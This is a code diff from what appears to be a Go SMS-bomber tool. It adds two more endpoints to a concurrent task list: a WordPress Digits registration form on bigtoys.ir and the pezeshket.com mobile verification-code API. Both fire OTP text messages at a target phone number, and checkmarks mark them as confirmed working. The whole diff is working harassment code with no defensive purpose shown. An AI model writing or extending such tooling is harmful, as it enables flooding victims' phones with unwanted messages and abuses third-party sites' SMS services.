@@ -1804,7 +1804,47 @@ tasks <- func(c *http.Client) func() {
 			}
 		}(client) 
 
+		// bigtoys.ir(Form) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action_type", "phone")
+				formData.Set("digt_countrycode", "+98")
+				formData.Set("phone", strings.TrimPrefix(phone, "0"))
+				formData.Set("email", "")
+				formData.Set("digits_reg_name", "monsmain")
+				formData.Set("digits_reg_password", "monsmain@")
+				formData.Set("digits_process_register", "1")
+				formData.Set("optional_email", "")
+				formData.Set("is_digits_optional_data", "1")
+				formData.Set("sms_otp", "")
+				formData.Set("otp_step_1", "1")
+				formData.Set("signup_otp_mode", "1")
+				formData.Set("instance_id", "336977930ed5775e9a1cfa3588d86e2b") //cheack
+				formData.Set("optional_data", "email")
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "register")
+				formData.Set("dig_otp", "")
+				formData.Set("digits", "1")
+				formData.Set("digits_redirect_page", "//www.bigtoys.ir/")
+				formData.Set("digits_form", "32f7865dbe") //cheack
+				formData.Set("_wp_http_referer", "/")
+				formData.Set("container", "digits_protected")
+				formData.Set("sub_action", "sms_otp")
+				sendFormRequest(c, ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
 
+		// pezeshket.com (JSON) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2", map[string]interface{}{
+					"mobileNumber": phone,
+				}, &wg, ch)
+			}
+		}(client)
 
 
 
